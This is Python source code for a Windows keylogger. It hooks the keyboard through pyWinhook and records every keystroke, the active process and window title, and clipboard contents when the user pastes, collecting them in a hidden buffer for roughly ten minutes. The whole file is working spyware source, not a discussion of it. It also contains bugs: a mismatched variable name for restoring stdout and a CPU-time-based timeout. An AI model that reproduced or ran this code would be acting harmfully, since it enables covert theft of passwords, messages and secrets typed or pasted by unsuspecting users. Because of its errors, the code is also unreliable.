#===========================#
# I M P O R T S             #
#===========================#

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

#===========================#

class KeyLogger:

    def __init__(self):
    
        self.currentWindow = None
        
    def getCurrentProcess(self):
    
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        processID = f'{pid.value}'
        
        executable = create_string_buffer(512)
        hProcess = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(hProcess, None, byref(executable), 512)
        windowTitle = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(windowTitle), 512)
        
        try:
            self.currentWindow = windowTitle.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
        
        print('\n', processID, executable.value.decode(), self.currentWindow)
        
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(hProcess)
    
    def keystroke(self, event):
    
        if event.WindowName != self.currentWindow:
            self.getCurrentProcess()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        
        return True
    
#===========================#
    
def run():

    saveStdout = sys.stdout
    sys.stdout = StringIO()
    
    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.keystroke
    hm.HookKeyboard()
    
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
        
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    print(run())